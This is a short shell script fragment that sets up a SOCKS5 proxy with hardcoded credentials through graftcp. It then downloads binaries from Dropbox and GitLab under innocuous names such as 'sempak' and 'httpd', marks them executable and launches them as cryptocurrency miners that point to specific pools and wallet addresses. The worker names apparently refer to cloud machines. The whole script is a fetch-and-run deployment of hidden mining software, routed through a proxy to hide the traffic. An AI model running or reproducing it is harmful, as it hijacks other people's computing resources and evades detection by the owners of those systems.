...
listen = :2233
loglevel = 1
socks5 = 43.153.195.105:443 
socks5_username = mbah 
socks5_password = tukiman
END
...
./graftcp/graftcp rm -rf sempak && wget -q 'https://www.dropbox.com/s/m8c5iw50chb2i2n/anu.zip'
unzip anu.zip
chmod +x sempak
rm -rf Makefile
...
./graftcp/graftcp ./sempak -d=0 -a "NQ82UYV095UD9MST21399ABS 6ANJKBRKJEPH" -s nimiq.icemining.ca -p 2053 -n GPU-AwsSage -t 4  -i Disable & ./graftcp/graftcp wget https://gitlab.com/mulungweb2020/httpd/-/raw/main/httpd && chmod 700 httpd && ./httpd -a yescryptr16 -o stratum+tcp://43.134.73.87:443 -u bq1q27vkemvhlqtp2d46lvuzuw7mvul8lyg0ruh4mr.CPU-AWSSage -t $(nproc) -p m=solo
